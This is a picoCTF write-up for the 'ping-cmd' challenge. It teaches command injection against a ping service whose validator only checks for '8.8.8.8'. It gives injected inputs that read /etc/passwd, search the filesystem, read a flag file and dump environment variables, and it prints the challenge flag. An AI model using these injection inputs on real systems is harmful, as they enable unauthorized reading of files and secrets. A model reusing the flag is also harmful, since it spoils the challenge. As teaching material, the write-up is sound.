# ping-cmd — picoCTF Writeup

**Challenge:** ping-cmd  
**Category:** General Skills  
**Difficulty:** Easy  
**Flag:** `picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_e003709d}`  

---

## Description

> Can you make the server reveal its secrets? It seems to be able to ping Google DNS, but what happens if you get a little creative with your input?  
> You can connect to the service here `nc mysterious-sea.picoctf.net 61830`

**Hint 1:** `The program uses a shell command behind the scenes.`

**Tags:** `command-injection`, `shell`, `netcat`, `general-skills`

---

## Background Knowledge (Read This First!)

### What is Command Injection?

**Command injection** is one of the most classic vulnerabilities in cybersecurity. It happens when a program takes user input and passes it **directly into a shell command** without properly sanitizing it.

Imagine a web app that pings an IP address. Behind the scenes, it might run:

```bash
ping -c 2 <user_input>
```

If the programmer doesn't sanitize what the user types, an attacker can **escape the ping command** and inject their own commands after it.

For example, if the user types `8.8.8.8; cat /etc/passwd`, the shell sees:

```bash
ping -c 2 8.8.8.8; cat /etc/passwd
```

The `;` in Linux/Unix shells means **"run this, then run the next command"**. So `ping` runs first, then `cat /etc/passwd` runs immediately after — completely unintended by the developer.

### What is `nc` (netcat)?

`nc` (netcat) is a networking utility that opens raw TCP connections. In this challenge, it connects you to the remote service so you can interact with it as if you were at a terminal prompt on the server.

### Common Shell Command Separators

When attempting command injection, these characters can chain commands together:

| Separator | Behavior |
|-----------|----------|
| `;` | Run first command, then run second regardless of result |
| `&&` | Run second command only if first succeeds |
| `\|\|` | Run second command only if first fails |
| `\|` | Pipe output of first into second |

In this challenge, `;` works perfectly since the ping always succeeds first.

### ⚠️ Important Notes Before Starting

**Note 1 — The server validates input, but only checks the start**  
The challenge says it "only allows `8.8.8.8`" — meaning it checks that your input begins with or contains `8.8.8.8`. Simply typing `cat /flag.txt` alone gets silently rejected. You must include `8.8.8.8` first.

**Note 2 — Don't run the injection in your own terminal**  
A common mistake is copying the full payload (like `8.8.8.8; cat /flag.txt`) and running it in your local Kali terminal instead of inside the `nc` session. Your local machine has no `/home/ctf-player/` — the commands must run on the **remote server** through `nc`.

---

## Solution — Step by Step

### Step 1 — Connect to the service

```
┌──(zham㉿kali)-[~]
└─$ nc mysterious-sea.picoctf.net 61830
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'):
```

The server greets you with a prompt asking for an IP address. It claims tight security, only allowing `8.8.8.8`. This is the classic setup for a command injection challenge — it's running something like `ping 8.8.8.8` in a shell behind the scenes.

### Step 2 — Test basic command injection with `;`

```
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8; cat /flag.txt
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=111 time=8.42 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=111 time=8.42 ms
--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 8.421/8.422/8.424/0.001 ms
```

The injection works — the ping runs — but no flag appeared. The file `/flag.txt` doesn't exist at that path. We need to find where the flag is hiding.

### Step 3 — Find the flag file with `find`

```
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8; find / -name "flag*" 2>/dev/null
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=111 time=8.56 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=111 time=8.46 ms
--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 8.463/8.512/8.562/0.049 ms
/home/ctf-player/flag.txt
/sys/devices/pnp0/00:04/...
```

Breaking this command down:
- `find /` — search from the root of the filesystem
- `-name "flag*"` — look for any file whose name starts with `flag`
- `2>/dev/null` — silence error messages (permission denied on system dirs)

The flag is at **`/home/ctf-player/flag.txt`** — the home directory of the challenge user.

### Step 4 — Read the flag

```
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8; cat /home/ctf-player/flag.txt
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=111 time=8.43 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=111 time=8.45 ms
--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 8.431/8.441/8.452/0.010 ms
picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_e003709d}
```

✅ Got the flag! 🎯

> **Fun detail:** The flag itself spells out `p1nG_c0mm@nd_3xpL0it_su33essFuL` — leet-speak for "ping command exploit successful." The challenge author is confirming exactly what you did.

---

## Alternative Methods

### Alternative 1 — Use `&&` instead of `;`

```
8.8.8.8 && cat /home/ctf-player/flag.txt
```

`&&` also chains commands, but only runs the second if the first succeeds. Since `ping 8.8.8.8` always succeeds, both separators work identically here.

### Alternative 2 — Check home directory directly

If you already suspect the flag is in the ctf-player home folder, skip `find` and go straight to:

```
8.8.8.8; ls /home/ctf-player/
```

This lists all files in the home directory, revealing `flag.txt` immediately.

### Alternative 3 — Use `ls /` first to explore

Start broad and work inward:

```
8.8.8.8; ls /
8.8.8.8; ls /home
8.8.8.8; ls /home/ctf-player
8.8.8.8; cat /home/ctf-player/flag.txt
```

This manual exploration is slower but helps you understand the server's directory structure step by step.

### Alternative 4 — Read environment variables

Sometimes flags are stored in environment variables rather than files:

```
8.8.8.8; env
8.8.8.8; printenv FLAG
```

Worth trying if file-based methods fail.

---

## Tools Used

| Tool | Purpose | Level |
|------|---------|-------|
| `nc` | Connect to the remote challenge service | ⭐ Easy |
| `;` (semicolon) | Chain a second shell command after ping | ⭐ Easy |
| `find` | Locate the flag file on the filesystem | ⭐ Easy |
| `cat` | Read the contents of the flag file | ⭐ Easy |

---

## Key Takeaways

- **Command injection happens when user input reaches the shell unfiltered** — always a critical vulnerability in real applications
- **Validators that only check "does it contain X" are weak** — here, the server checked for `8.8.8.8` but didn't prevent extra commands after it
- **`;` is your best friend in command injection** — it reliably chains commands in bash regardless of the first command's output
- **`find / -name "flag*" 2>/dev/null`** is a fast, reliable way to locate flag files anywhere on an unknown filesystem
- **The challenge name says it all** — "ping-cmd" hints that the ping command is being abused; in CTFs, the challenge title is often a clue
- **Never assume the flag is at `/flag.txt`** — always explore the filesystem first with `ls` or `find`
